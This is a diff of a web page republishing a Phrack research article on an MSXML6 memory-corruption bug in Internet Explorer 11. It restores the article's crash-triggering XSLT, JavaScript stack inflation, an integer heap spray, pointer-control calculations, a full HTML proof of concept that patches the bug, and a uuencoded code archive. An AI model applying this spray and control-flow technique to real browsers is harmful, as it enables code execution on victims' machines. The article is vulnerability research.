@@ -127,34 +127,7 @@
 
                            <p>Originally published in <a class="underline" target="_blank" href="http://phrack.org/issues/69/10.html">Phrack Magazine, Volume 0x0f, Issue 0x45, Phile #0x0a</a>.</p>
 
-                           <pre style="font-size:12px; line-height:1.4; white-space:pre; overflow-x:auto; padding:16px; background:rgba(255,255,255,0.02); border:1px solid rgba(255,255,255,0.08);">                              ==Phrack Inc.==
-
-                Volume 0x0f, Issue 0x45, Phile #0x0a of 0x10
-
-|=----------------------------------------------------------------------=|
-|=---------------=[      The Art of Exploitation      ]=----------------=|
-|=----------------------------------------------------------------------=|
-|=--=[ Self-patching Microsoft XML with misalignments and factorials ]=-=|
-|=----------------------------------------------------------------------=|
-|=------------------------=[ by Alisa Esage ]=--------------------------=|
-|=-------------------------=[ alisa (at) esagelab (dot) com ]=---------------------------=|
-|=----------------------------------------------------------------------=|
-
-                              &quot;Maybe it says something about human nature,
-                         that the only form of life we have created so far
-                                                   is purely destructive.&quot;
-                                   --  Stephen Hawking on computer viruses
-
-
-                              &quot;I&#x27;ve tried to imagine what it would be like
-             to be a newcomer [in vulnerability research] in current times
-                                             and it&#x27;s a bit depressing...&quot;
-                                               -- Aaron Portnoy for PHRACK
-
-
-
-
-In this article a vulnerable Microsoft XML module is directed into
+                           <pre style="font-size:13px; line-height:1.5; white-space:pre; overflow-x:auto; color:rgba(237,234,230,0.75); background:transparent; border:none; padding:0; font-family:'SF Mono', Menlo, Consolas, 'Roboto Mono', monospace; font-weight:300;">In this article a vulnerable Microsoft XML module is directed into
 invulnerable behavior by self-serving a two-byte inline memory patch
 through an arbitrary code execution opportunity.
 
@@ -272,17 +245,18 @@ The original crash inducing code published [2] without much details by the
 researcher was a piece of XSLT code:
 
 
+&lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
+version=&quot;1.0&quot;&gt;
 
+      &lt;xsl:template name=&quot;main_template&quot; match=&quot;/&quot;&gt;
+              &lt;xsl:for-each select=&quot;*&quot;&gt;
+                      &lt;xsl:apply-templates/&gt;
+              &lt;/xsl:for-each&gt;
+      &lt;/xsl:template&gt;
 
-      
-              
-                      
-              
-      
+      &lt;xsl:template name=&quot;xxx_nonexistent&quot; match=&quot;//xxx[position()]&quot; /&gt;
 
-      
-
-
+&lt;/xsl:stylesheet&gt;
 
 
 XSLT is the standard extension to XML which serves to perform analysis and
@@ -374,7 +348,12 @@ Microsoft XML Core Services is to call the transformNode() method from
 the COM/ActiveX object MSXML2.DOMDocument.6.0 via e.g. JavaScript:
 
 
-  xslcontent=&#x27;&#x27;;
+  xslcontent=&#x27;&lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/
+  Transform&quot;
+  version=&quot;1.0&quot;&gt;&lt;xsl:template name=&quot;main_template&quot; match=&quot;/&quot;&gt;&lt;xsl:for-each
+  select=&quot;*&quot;&gt;&lt;xsl:apply-templates/&gt;&lt;/xsl:for-each&gt;&lt;/xsl:template&gt;&lt;
+  xsl:template
+  name=&quot;xx&quot; match=&quot;x[position()]&quot; /&gt;&lt;/xsl:stylesheet&gt;&#x27;;
 
   srcTree=new ActiveXObject(&quot;Msxml2.DOMDocument.6.0&quot;);
   xsltTree=new ActiveXObject(&quot;Msxml2.DOMDocument.6.0&quot;);
@@ -750,17 +729,19 @@ the following XSLT code would cause a 6-bytes misaligned memory access in
 XEngine::stns():
 
 
+&lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
+version=&quot;1.0&quot;&gt;
 
+      &lt;xsl:template name=&quot;main_template&quot; match=&quot;/&quot;&gt;
+              &lt;xsl:for-each select=&quot;*&quot;&gt;
+                      &lt;xsl:apply-templates/&gt;
+              &lt;/xsl:for-each&gt;
+      &lt;/xsl:template&gt;
 
-      
-              
-                      
-              
-      
+      &lt;xsl:template name=&quot;xxx_nonexistent&quot;
+      match=&quot;//xxx[position()=last()]&quot; /&gt;
 
-      
-
-
+&lt;/xsl:stylesheet&gt;
 
 
 However, a 6-bytes misaligned pointer crash is not possible to control,
@@ -994,63 +975,64 @@ implementation in XSLT, will produce a massive recursion on the stack (
 for the record, it might even DoS the browser with big enough $n):
 
 
+&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;xsl:stylesheet version=&quot;1.0&quot;
+xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;&gt;
 
+&lt;xsl:template match=&quot;/&quot;&gt;
+  &lt;xsl:variable name=&quot;n&quot;&gt;
+    &lt;xsl:value-of select=&quot;//arg/@n&quot;/&gt;
+  &lt;/xsl:variable&gt;
+  &lt;xsl:element name=&quot;hanoi-solve&quot;&gt;
+  &lt;xsl:call-template name=&quot;dohanoi&quot;&gt;
+    &lt;xsl:with-param name=&quot;n&quot; select=&quot;30&quot;/&gt;
+    &lt;xsl:with-param name=&quot;to&quot; select=&quot;3&quot;/&gt;
+    &lt;xsl:with-param name=&quot;from&quot; select=&quot;1&quot;/&gt;
+    &lt;xsl:with-param name=&quot;using&quot; select=&quot;2&quot;/&gt;
+  &lt;/xsl:call-template&gt;
+&lt;/xsl:element&gt;
+&lt;/xsl:template&gt;
 
+&lt;xsl:template name=&quot;dohanoi&quot;&gt;
+  &lt;xsl:param name=&quot;n&quot;/&gt;
+  &lt;xsl:param name=&quot;to&quot;/&gt;
+  &lt;xsl:param name=&quot;from&quot;/&gt;
+  &lt;xsl:param name=&quot;using&quot;/&gt;
+  &lt;xsl:if test=&quot;number($n) &amp;gt; 0&quot;&gt;
 
+  &lt;xsl:call-template name=&quot;dohanoi&quot;&gt;
+    &lt;xsl:with-param name=&quot;n&quot; select=&quot;number($n) - 1&quot;/&gt;
+    &lt;xsl:with-param name=&quot;to&quot; select=&quot;$using&quot;/&gt;
+    &lt;xsl:with-param name=&quot;from&quot; select=&quot;$from&quot;/&gt;
+    &lt;xsl:with-param name=&quot;using&quot; select=&quot;$to&quot;/&gt;
+  &lt;/xsl:call-template&gt;
 
-  
-    
-  
-  
-  
-    
-    
-    
-    
-  
+  &lt;xsl:element name=&quot;move&quot;&gt;
+  &lt;xsl:attribute name=&quot;from&quot;&gt;
+    &lt;xsl:value-of select=&quot;$from&quot;/&gt;
+  &lt;/xsl:attribute&gt;
+  &lt;xsl:attribute name=&quot;to&quot;&gt;
+    &lt;xsl:value-of select=&quot;$to&quot;/&gt;
+  &lt;/xsl:attribute&gt;
+  &lt;/xsl:element&gt;
 
+  &lt;xsl:call-template name=&quot;dohanoi&quot;&gt;
+    &lt;xsl:with-param name=&quot;n&quot; select=&quot;number($n) - 1&quot;/&gt;
+    &lt;xsl:with-param name=&quot;to&quot; select=&quot;$to&quot;/&gt;
+    &lt;xsl:with-param name=&quot;from&quot; select=&quot;$using&quot;/&gt;
+    &lt;xsl:with-param name=&quot;using&quot; select=&quot;$from&quot;/&gt;
+  &lt;/xsl:call-template&gt;
 
+  &lt;xsl:for-each select=&quot;*&quot;&gt;
+    &lt;xsl:apply-templates/&gt;
+  &lt;/xsl:for-each&gt;
 
+&lt;/xsl:if&gt;
+&lt;/xsl:template&gt;
 
-  
-  
-  
-  
-   0&quot;&gt;
+&lt;xsl:template name=&quot;xxx_nonexistent&quot; match=&quot;//xxx[position()]&quot; /&gt;
 
-  
-    
-    
-    
-    
-  
-
-  
-  
-    
-  
-  
-    
-  
-  
-
-  
-    
-    
-    
-    
-  
-
-  
-    
-  
-
-
-
-
-
-
-
+&lt;/xsl:stylesheet&gt;
 
 
 Sadly, the XSLT-based recursion inflates the stack above and not below the
@@ -1068,7 +1050,32 @@ affect the crashing context at all:
   0ed78da8 711b60cc msxml6!XEngine::frame+0x84
   ; skipped many frame()&#x27;s
   0ed7b5e8 msxml6!XEngine::frame+0x84
-  ; --&gt; the vulnerable stack frame 
+  ; --&gt; the vulnerable stack frame &lt;--
+  0ed7b668 711c3e2d msxml6!XEngine::frame+0x84
+  0ed7b710 7122ffb0 msxml6!XEngine::execute+0x1b4
+  0ed7b76c 7122fee3 msxml6!XUtility::executeXCode+0x90
+  0ed7b7c0 7122fe2b msxml6!XUtility::transformNode+0x4a
+  0ed7b82c 7122fda2 msxml6!DOMNode::transformNode+0xa6
+  ...
+
+
+--[ 3.2 - Inflating the stack 2: JavaScript recursion
+
+After the fail with XSLT recursion I turned back to JavaScript. The
+following simple factorial implementation will produce a massive
+recursion on the stack:
+
+
+  function factorial(n) {
+    if(n == 0) {
+        trigger();
+        return 1
+    } else {
+        return n * factorial(n - 1);
+    }
+  }
+  ...
+  &lt;body onload=&quot;factorial(63)&quot;&gt;
 
 
 The vulnerability must be triggered from within the recursive code in
@@ -1085,7 +1092,7 @@ order to enjoy the inflated stack situation:
   End Address:            03a60000
   Region Size:            000ff000
   State:                  00002000  MEM_RESERVE
-  Protect:                
+  Protect:                &lt;info not present at the target&gt;
   Type:                   00020000  MEM_PRIVATE
   Allocation Base:        03960000
   Allocation Protect:     00000001  PAGE_NOACCESS
@@ -1099,11 +1106,158 @@ order to enjoy the inflated stack situation:
   2:   015e0000
   3:   00010000
   4:   019f0000
-  5:   03720000  s 0 l?80000000 ee ff c0 01
+  5:   03720000 &lt; landed here
+  6:   06470000
+  7:   06900000
+  8:   06cd0000
+  9:   07cb0000
+ 10:   07dd0000
+ 11:   09380000
+ 12:   07d60000
+ 13:   0c500000
+ 14:   0c670000
+ 15:   0cd30000
+
+
+This time a valid userland address was accessed, and the access violation
+was caused merely by the lack of a busy allocation on the address.
+
+According to the observations made across multiple tests, the thread
+stack will always start slightly below the edge of the memory page:
+
+
+  test 1:
+  0532fbbc 00000000 ntdll!_RtlUserThreadStart+0x1b
+  test 2:
+  04d7fd34 00000000 ntdll!_RtlUserThreadStart+0x1b
+  test 3:
+  04a5ffd8 00000000 ntdll!_RtlUserThreadStart+0x1b
+  test 4:
+  055bfe80 00000000 ntdll!_RtlUserThreadStart+0x1b
+
+
+More precisely, the exact address of the beginning of the stack is
+variable within the range of roughly 0x600 bytes, and so are the pointers
+to stack-based variables; thus, the crashing pointer would be variable by
+0x06000000 on x86 systems, which means that the initial invalid memory
+access would be observed at a random memory address within a 100 Mb
+memory range.
+
+At this point we have two separate problems: first, to quickly fill at
+least 200-300 Mb of memory with controlled data (100 Mb required to catch
+the initial memory access, plus the room for secondary pointer
+dereference padding, plus some compensation for the allocation addresses
+variability), and second, to direct the crashing pointer into a specific
+region of that memory.
+
+Note that, although heap spraying is considered a bad practice for a good
+reason, and that it&#x27;s highly constrained if not impossible on 64bit
+systems with 128G of memory space to fill, but the nature of our
+vulnerability does not allow for an alternative approach. So, let&#x27;s just
+take it as an exercise in the artful dealing with whatever is.
+
+
+--[ 3.4 - Filling the memory 1: images
+
+Because the memory region that must be controlled is rather big, my
+initial idea was to utilize some pre-calculated big objects for filling
+it, such as images. The core of the idea is that, every piece of data
+that can be consumed and processed by the target application (e.g. output
+or rendered) has its place and a representation in the target process
+memory. Thinking like that we don&#x27;t get caught in stereotypical terms of
+&#x27;heap spraying&#x27; and the specific techniques associated with it, many of
+which are already mitigated in browsers.
+
+The idea of using graphical images in vulnerability development is not
+new. It was first introduced in 2006 by Sutton et al.[3], whose research
+focused mainly on the aesthetics of shellcode steganography in images
+rather than solving of any problems of heap spraying (as there were none
+at that time). Later, a few researchers revisited the same idea in the
+context of heap spraying, but it has never found a real application,
+mainly because bitmaps (as the only format capable of incorporating a
+byte pattern &#x27;as is&#x27;) are huge and can only be shrinked with the help of
+server-side measures, while using other image formats for memory control
+purposes is burdened with calculation problems of recompression.
+
+Apart from the server-side GZIP compression, another solution that&#x27;s never
+publicly noted is PNG. The PNG compression is very simple and does not
+affect the bitmap structure at large. As a result, a 2Mb BMP image
+containing a simple 1-byte pattern can be converted into a ~500 bytes PNG
+image, that will be decompressed back into the original bitmap in the
+rendering process memory.
+
+There are two problems however:
+
+1. The more variable is the source bitmap pattern, the bigger is the
+resulting PNG image; a natural limitation of any compression.
+
+2. The decompressed PNG has extra bytes in the bitmap data, injected after
+every 3 bytes of the original bitmap. It&#x27;s probably a transparency channel
+or some other data specific to the PNG format.
+
+The good news:
+
+1. At the point when the PNG image is loaded and decompressed by the
+browser but is not yet displayed on the web page, the bitmap data in the
+process memory fully corresponds to the source BMP.
+
+2. A large image is mapped into a comparably large and continuous chunk of
+memory, located at a somewhat predictable memory offset.
+
+The PNG spraying technique proved to be not suitable for this particular
+case because a highly variable memory padding pattern would be required,
+and so the images would have to be too big anyway. However it still looks
+like an interesting technique for rapid filling of huge memory areas with
+a simple byte pattern.
+
+
+--[ 3.5 - Filling the memory 2: integers
+
+After testing various memory filling techniques, I&#x27;ve finally settled on
+integer arrays. The following JavaScript code will quickly fill 400Mb of
+the memory of Internet Explorer 11 with a continuous constant-dword spray:
+
+
+  var intArr = new Array;
+  var count = (0x19000000-0x20)/4;
+  intArr[0] = 0x01c0ffee; // marker // s 0 l?80000000 ee ff c0 01
+  for(var i=1; i&lt;=count; i++)
+  intArr[i] = 0x17151715;
+  alert(&#x27;done&#x27;);
+
+
+It&#x27;s curious to note that varying the values in the spraying loop may
+sometimes result in an internal exception in IE, e.g. when trying to fill
+more than 400 Mb of the browser memory, or using an &#x27;AAAA&#x27; integer
+equivalent for the filling. This looks like a protection from heap
+spraying, but it does not pose a major obstacle to the task.
+
+The resulting memory filling is distributed across two big and continuous
+allocations as follows:
+
+
+  0:028&gt; s 0 l?80000000 ee ff c0 01
   0531b4f0  ee ff c0 01 f8 ff ff ff-00 00 00 00 00 00 00 00  .............
   ; just the marker dword, not relevant
   08391860  ee ff c0 01 15 17 15 17-15 17 15 17 15 17 15 17  .............
-  ; a  s 0 l?80000000 ee ff c0 01
+  ; a &lt;0x200 bytes chunk, not relevant
+  085dd0d8  ee ff c0 01 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  ; a &lt;0x10 bytes chunk, not relevant
+  085de510  ee ff c0 01 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  ; a &lt;0x200 bytes chunk, not relevant
+  12da5a18  ee ff c0 01 e3 ff c0 01-ce ff c3 01 b8 ff cc 01  .............
+  ; random garbage
+  2c540020  ee ff c0 01 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  ; the array, part 1
+  3eec0020  ee ff c0 01 15 17 15 17-15 17 15 17 15 17 15 17  .............
+  ; the array, part 2
+
+
+The first allocation looks like simply unfinished, stopped around 300Mb,
+while the second allocation is full, and both of them are contiguous:
+
+
+  0:028&gt; s 0 l?80000000 ee ff c0 01
   ...
   2c540020  ee ff c0 01 15 17 15 17-15 17 15 17 15 17 15 17  .............
   3eec0020  ee ff c0 01 15 17 15 17-15 17 15 17 15 17 15 17  .............
@@ -1255,13 +1409,13 @@ The size of one JavaScript recursion frame in Internet Explorer 11 is
 
 
   ; JavaScript factorial algorithm recursion on the stack
-  0529b0d4 jscript9!Js::InterpreterStackFrame::InterpreterThunk+0x1e8
+  0529b0d4 jscript9!Js::InterpreterStackFrame::InterpreterThunk&lt;1&gt;+0x1e8
   0529b0e0 0x86c0fd9
   0529b428 jscript9!Js::InterpreterStackFrame::Process+0xbd7
-  0529b544 jscript9!Js::InterpreterStackFrame::InterpreterThunk+0x1e8
+  0529b544 jscript9!Js::InterpreterStackFrame::InterpreterThunk&lt;1&gt;+0x1e8
   0529b550 0x86c0fd9
   0529b898 jscript9!Js::InterpreterStackFrame::Process+0xbd7
-  0529b9b4 jscript9!Js::InterpreterStackFrame::InterpreterThunk+0x1e8
+  0529b9b4 jscript9!Js::InterpreterStackFrame::InterpreterThunk&lt;1&gt;+0x1e8
   0529b9c0 0x86c0fd9
 
 
@@ -1344,7 +1498,21 @@ the shellcode, and the presize addresses treated specifically:
 
     var count = (0x19000000-0x20)/4; // 400 Mb
 
-    for(var i=1; i shell code
+    for(var i=1; i&lt;=count; i++)
+    {
+        // part1: ptr0/ptr1 read
+        if ( i&lt;(0x12000000/4) )
+        {
+
+            if ( ((i*4+0x20)&amp;0xffff) == (0x3c3c+4) ) //if it&#x27;s a ptr1 read
+                intArr[i] = 0x54545454; // then yield ptr2
+            else
+                intArr[i] = 0x3c3c3c3c; // otherwise, ptr1
+
+        }
+        // part2: ptr2 read
+        else
+            intArr[i] = 0x00badd1e; // ptr3 -&gt; shell code
     }
     crash();
   }
@@ -1413,7 +1581,50 @@ pointers, we split the page-sized pattern in two halves and fill them
 differently:
 
 
-  else if (i_pattern  dd 4b6004e0+8
+  else if (i_pattern &lt; 0x0700)
+    intArr[i] = ptr12base + ptr1;
+  else
+    intArr[i] = ptr12base + ptr2;
+
+
+This trick is only possible because of very little entropy observed in the
+high-order part of the randomly allocated stack offset, which tends to be
+around 0x04xxxxxx-0x06xxxxxx. Hence we in fact only want to leak 11 bits
+of the address and not 16, for which a 0x700 bytes pattern is sufficient.
+
+5. We differentiate the pointers in the two parts of the pattern by
+adding and removing a hand-picked, semi-random delta value to the leaking
+part of the pointer:
+
+
+  var delta = 0x3300;
+
+
+6. Finally, we adjust the calculations to the values of the respective
+dereference indexes, e.g. [eax+8] for the first read, as well as to the
+size of the heap header, which is 0x20 with full page heap:
+
+
+  ptr1 = (i_pattern - 8 + 0x20 + delta);
+  ptr2 = (i_pattern - 4 + 0x20 - (delta&amp;0xfff));
+
+
+Note that we mindfully use a delta value bigger than the size of the
+pattern, and then we also preserve the 2 higher bits of the added delta
+value in the 2nd stage pointers, that will eventually increase the
+reliability of the padding in the cases of misaligned memory access by
+ensuring that the majority of bytes in the spray will be equal to 0x38,
+and thus the final pointer will likely point into the controlled memory
+around 0x38xxxxxx, regardless of both the reading
+alignment and the leaked bits in the pointer.
+
+As a result of the correctly calculated and a correctly positioned
+padding, the initially read memory offset will re-surface in the program
+as the low-order word of the value that&#x27;s eventually read from the range
+0x3838xxxx:
+
+
+  0:007&gt; dd 4b6004e0+8
   ; 4b6004e0 = the original AV pointer
   ; 0th read // mov     edx,dword ptr [eax+8]
   4b6004e8  383837e0 383837e4 383837e8 383837ec
@@ -1466,7 +1677,7 @@ like if there was no vulnerability:
 
   ; the original call pointer restored:
   0:007&gt; dds poi 04e04c2c
-  6f6e44b8  6f6e44d5 msxml6!XPSingleTextNav::_getParent
+  6f6e44b8  6f6e44d5 msxml6!XPSingleTextNav&lt;WhitespaceCheck&gt;::_getParent
 
 
 And the result is the target application passing the crash-inducing code
@@ -1496,7 +1707,55 @@ of the page may be used for the translation purposes:
   ptr1 = (i_pattern - 8 + 0x20 + delta);
   ptr2 = (i_pattern - 4 + 0x20 - (delta&amp;0xfff));
 
-  if (i_pattern  r
+  if (i_pattern &lt; 0x0700)
+    intArr[i] = ptr12base + ptr1;
+  else
+    intArr[i] = ptr12base + ptr2;
+
+
+The problem here is that the original crashing pointer is not guaranteed
+to be correctly aligned, while the memory translation pattern must be
+dword-aligned. That is, the correctly aligned memory access will result
+in reading a value like 0x3838XYZQ from the spray, where XYZQ are the
+leaked bits of the stack offset. But let&#x27;s see what&#x27;s read with a
+misaligned pointer:
+
+a. off by 1: 0x38XYZQ38
+
+In this case the pointer still falls into the controlled memory area, but
+the XY bits of the leaked stack address will be mangled, because we can
+only guarantee 64Kb alignment of memory allocations.
+
+b. off by 2: 0xXYZQ3838
+
+All bits of the stack address are lost, and the pointer looks
+unpredictable. But we can still enforce this to point to the controlled
+memory around 0x38xxxxxx by adding a specially crafted delta value of
+0x3300 to calculated pointers in the spray as was mentioned earlier. So,
+e.g. the read value 0x07073838 will become a valid pointer to 0x3a373838.
+This is possible because the high 4 bits of the stack offset tend to be
+zero.
+
+c. off by 3: 0xZQ3838XY
+
+Most important bits of the stack offset are lost in this case, and also
+the ZQ leaked bits are highly entropic and cannot be made predictable as
+in the case b. Not much can be done with this case, that&#x27;s likely to
+point into random memory and possibly cause an access violation.
+
+One thing to notice about the misalignment cases above is that both
+pointers a. and b. quite logically end with 0x38 that we use as the
+pattern base. So, we can catch 2 out of 3 misalignment cases in the code
+by checking the final byte against this value, and then address them
+specifically e.g. to fall back to raw EIP control instead of allowing a
+crash:
+
+
+  // the address ends with 0x38+4:
+  if ( ((i*4+0x20)&amp;0xff) == (pbyte+4) )
+    intArr[i] = ptrcall;
+  ...
+  0:007&gt; r
   eax=4fc0055e ; the crashing pointer
   ...
   0:007&gt; dd eax+8
@@ -1536,17 +1795,22 @@ alone as a crash.
 The final code is:
 
 
-  
-  
-  
+  &lt;!doctype html&gt;
+  &lt;html&gt;
+  &lt;head&gt;
 
-  
+  &lt;script&gt;
 
   function crash()
   {
     xslcontent=
-    &#x27;
-    &#x27;;
+    &#x27;&lt;xsl:stylesheet
+    xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; \\
+    version=&quot;1.0&quot;&gt;&lt;xsl:template name=&quot;main_template&quot;
+    match=&quot;/&quot;&gt;&lt;xsl:for-each \\
+    select=&quot;*&quot;&gt;&lt;xsl:apply-templates/&gt;&lt;/xsl:for-each&gt;
+    &lt;/xsl:template&gt;&lt;xsl:template \\ name=&quot;xx&quot;
+    match=&quot;x[position()]&quot; /&gt;&lt;/xsl:stylesheet&gt;&#x27;;
 
     srcTree=new ActiveXObject(&quot;Msxml2.DOMDocument.6.0&quot;);
     xsltTree=new ActiveXObject(&quot;Msxml2.DOMDocument.6.0&quot;);
@@ -1570,7 +1834,10 @@ The final code is:
 
     var pbyte = 0x38; // play with me
     // landing for the initial memory access:
-    var ptr12base = (pbyte pointers to call address
+    var ptr12base = (pbyte&lt;&lt;24)+(pbyte&lt;&lt;16);  //0x38380000
+    var ptr1 = 0; // calculated from the page offset
+    var ptr2 = 0; // calculated from the page offset
+    var ptrcall = 0x54545454; // 0x5454xxxx -&gt; pointers to call address
 
     var delta = 0x3300;
     // delta is added and removed to segregate the 1st
@@ -1578,7 +1845,12 @@ The final code is:
     // the additional bits above 0x1000 are used to enforce
     // the successful 1-byte misaligned memory access
 
-    for(var i=1; i(0x12000000/4) ) // which defines where the &#x27;tail&#x27; begins
+    for(var i=1; i&lt;=count; i++)
+    {
+        var i_pattern = i*4%0x1000; // index into the current page
+
+        // let&#x27;s fill the spray tail with plain pointers to shellcode
+        if ( i&gt;(0x12000000/4) ) // which defines where the &#x27;tail&#x27; begins
         {
             intArr[i] = 0x00badd1e;
             continue;
@@ -1592,18 +1864,38 @@ The final code is:
             intArr[i] = ptrcall;
 
         // well aligned memory access: restore the pointers
-        else if (i_pattern 
+        else if (i_pattern &lt; 0x0700)
+            intArr[i] = ptr12base + ptr1;
+        else
+            intArr[i] = ptr12base + ptr2;
+    }
 
-  
-  
-    
-    
-    
-    
-  
+    crash();
+    alert(&quot;Look, no calc!&quot;);
+  }
 
-  
-  
+  function factorial(n)
+  {
+    if (n == 0)
+    {
+        selfpatch();
+            return 1;
+        }
+    else
+        return n * factorial(n - 1);
+  }
+  &lt;/script&gt;
+
+  &lt;/head&gt;
+  &lt;body onload=&quot;factorial(30);&quot;&gt;
+    &lt;form id=&quot;a&quot;&gt;
+    &lt;/form&gt;
+    &lt;dfn id=&quot;b&quot;&gt;
+    &lt;/dfn&gt;
+  &lt;div id=&quot;resTree&quot;&gt;&lt;/div&gt;
+
+  &lt;/body&gt;
+  &lt;/html&gt;
 
 
 On my testing boxes, the final proof-of-concept code yields a self-patch
@@ -1808,8 +2100,47 @@ supply of cat photos and Nutella, and my grandma for her loving support.
 
 --[ 9 - Code
 
-
-[PoC code (tar.gz uuencoded) omitted here — retrieve from the original Phrack issue: http://phrack.org/issues/69/10.html]
+begin 644 code.tar.gz
+M&#x27;XL(`!:!EE4``^U9VV[;1A#-JP+X&#x27;\8&quot;VI!Q)5Y$2;9U*0+D,6X&gt;FH&lt;`01&quot;L
+MR*7$A!=UN;(D%/F(YHL[LTOJXMBQG4&quot;NV^XQ8&quot;[W,C,[,SM[)(59Y#PY,%S7
+M[??[H)Z]KGJZ?J&quot;?%&lt;#SNT$WZ/&gt;[K@^NY[O]X`ET#VT885%*)M`4EB8E^\8\
+MG!;&#x27;WQBO]K%Y_DL08OPE+V7[8WDP&#x27;;?%O^][=?R[W6Z`\&gt;\$OO&lt;$W(-9M(/_
+M&gt;?R!L&quot;K3L,@ES^7HV1!?SDNY3GDYXUS&quot;*DOS\AP[1\V9E/-SQUDNE^UEIUV(
+MJ&gt;.=G9TY;W]_Y;P1+&quot;_C0F1-N.2B3(I\U/3:;G.LQ$F&gt;S5,F.&gt;0LXZ-FQI+\
+M0]W7A(S)&lt;#9J.M5DE-+B+)Q!R5,&gt;RE&#x27;S&gt;37`YO-TW:K7E&lt;YXZ.S.KU[K\6LU
+MKU8;=:MW\Z),)%IJV&gt;^;4$O;[GS\;&#x27;#TM%&amp;*\(W@?)3S);P(97+)W[Z&gt;?$2[
+MK.9%B;[QVR]?7[PLPD6&amp;WFOW&lt;,LV+4-1\D?6M=.&quot;16\O7EG;T-@[YK1E[&gt;_?
+MBHA;]2J:&lt;L_XT_D/!2MG;6P=),/N4/^]_J;^!_T&gt;G?\&gt;U7]S_@^/L`Q%,I=P
+MZ#O`X&#x27;$BX0&gt;G?_?B?YW`Q?/O]?V&gt;X7\/`8R_&quot;&#x27;E[)K/T8#INB;_?[74V_,]W
+M*?X=O`!,_7\(#(^C(I3K.0=*@?&#x27;1T^&#x27;FR5F$3VSI*T*UXT4&gt;$F&lt;&quot;Q1DL&amp;XZ&gt;
+M_JEIBR&amp;0UQ+(QT&lt;A6&lt;H%BE`!;-Z)5#:.GG[&gt;&quot;_Z\&quot;.O0.PX&lt;&#x27;Q_#R6S.0/`_
+M%HG@$?6HD&lt;D&lt;,K*T=[SB^33)^3FZ)R\&#x27;UPU,!`U,M&lt;LNF8`DER^$@!&amp;H_0O!
+MUF2K[GWGOL&lt;!=^5ZH1O&#x27;G`\`M65,?.*&quot;6B6XD/YZ6M\MG$,&lt;0TB%92,]+!:Y
+M1!F6N_+.]+R6N_)=VPF4L`#774Q`S4&gt;76,JBD3&gt;`9#A2:[%U&lt;F+C*.5_`U?,
+MF9#&gt;.?H&amp;3&lt;0,!EFH+I^&amp;DQ@L7$G*?*W,&quot;6P@%S9H/3WT&#x27;,M*G@&lt;GRI&quot;?W56,
+ML&amp;&amp;DK.R$G?!DLZA1.R+1CJ#B27\#-&lt;C3DE\WBV30WT#OJ_%YQW1_WW3,X!33
+M)E)R2)Y6NR_/=2&lt;LBCQ.\I2PJBH,`*ZF3,Q&quot;68B$I59&gt;%PW:&lt;$Z[&lt;]6&gt;E!]5
+M9N$FH$)#&lt;+D0.7A57^,S3=W84XWF\&#x27;Q7`;3`(R%HP=#9%*^ALZUHDR):0Y&#x27;3
+M&quot;1DUMRL[KCUHXHS&amp;D$X!)#C(]+M#&#x27;:H5Q;D:F%0#^$[&quot;H^12=0M&gt;TJ&#x27;!BN-@
+ME];FD#IM`=76?[KD[P&#x27;O?RR3&lt;6M.1&gt;U`-.&quot;6^S_H!&lt;&#x27;F_O&lt;4_PMZ7?/]SX/`
+MW/_F_K_W_4\50Q6,&#x27;V(!-Y&amp;`1\D!Z):4PK64VY)\:K?&amp;^.ZI_WYKO+DN:1U&gt;
+MM*S==E&gt;!VVY#:TSOIYW3%6+[MD;0FW(C%&amp;+WPJW,FT_6F&#x27;?JWCY5]F`BKF&amp;9
+MR!EDO)Z#-O@35M(\2RT8#OW`/JG;7H\N8\?12I4G4%#*\@CW`!AKD#..;L8\
+M9BF*S0JQ!A:&amp;O&quot;QW-)`1RH*0I&gt;&amp;&quot;CD,$L2@RM7C.IAR*.&quot;ZYW&quot;[Q[[\$)Z;[
+M7$;[DIJU[VY@*)60B*&gt;2:8=U7*T=Z0DJQNUB6F;%);9I)9\*/J5#3&lt;9XI503
+MJ.WC&lt;\\)P`1GI7)ZDE&gt;V2[0@URE!&#x27;:A&quot;50&#x27;TWR21N&amp;*&quot;&gt;M`&amp;CYR-RV%1:K4\
+M1W^&#x27;6FFY4.+C10I&gt;2\4YP^LG3:8YCZZ&amp;X6X,5`U_J*Q#)R&quot;/_$D;H1R1Y!%?
+MT7DJE/YP(006!!4)S04I+;C\4D*&lt;8!R4C7,\;R!9DNJDP_1+\KT04,BV]&#x27;;\
+M%;U%F&lt;M9@OD=\1C/-_IQQH5VP%\D]PM,.![\$JQP5I0\!RRVB4A([-JNN/&amp;W
+M26&gt;C0:4MR1=\4!%:Q2)USEI;?[3@%$Z`#C&lt;^5)[8&gt;GV5JWM3@WIJ&quot;RPU5U-Q
+MVZYY,Q6:&amp;\)UCD0T32&lt;L_*0&lt;1!6!KW@(L/&#x27;358JO&quot;;XZKSO\?G?/U&gt;$8;)0O
+M,?/A!O5(0)&#x27;-:B?7L=IP&gt;#)@N],A&gt;;/ONO9U&amp;JNR&lt;J+:=`7&lt;]#&#x27;@REQ_H#\+
+M7/DT4%\[KXKBTR^0J]P)CYL53;__!X6=*^@__G&#x27;AWC_IW`O(__7//P?\!O`6
+M_N^Y?G?[_6]7_?[3]\WO/P^&quot;#=VODVZ&#x27;[!M6?S.K_SY2_YV&lt;_A9*_Q6COP.A
+MOU+K&#x27;O$W%`8&amp;!@8&amp;!@8&amp;!@8&amp;!@8&amp;!@8&amp;!@8&amp;!@8&amp;!@8&amp;!@8&amp;!@8&amp;!@8&amp;!@8&amp;
+0!@8&amp;!@8U_@9W7BIU`%``````
+`
+end
 
 
 --[ EOF
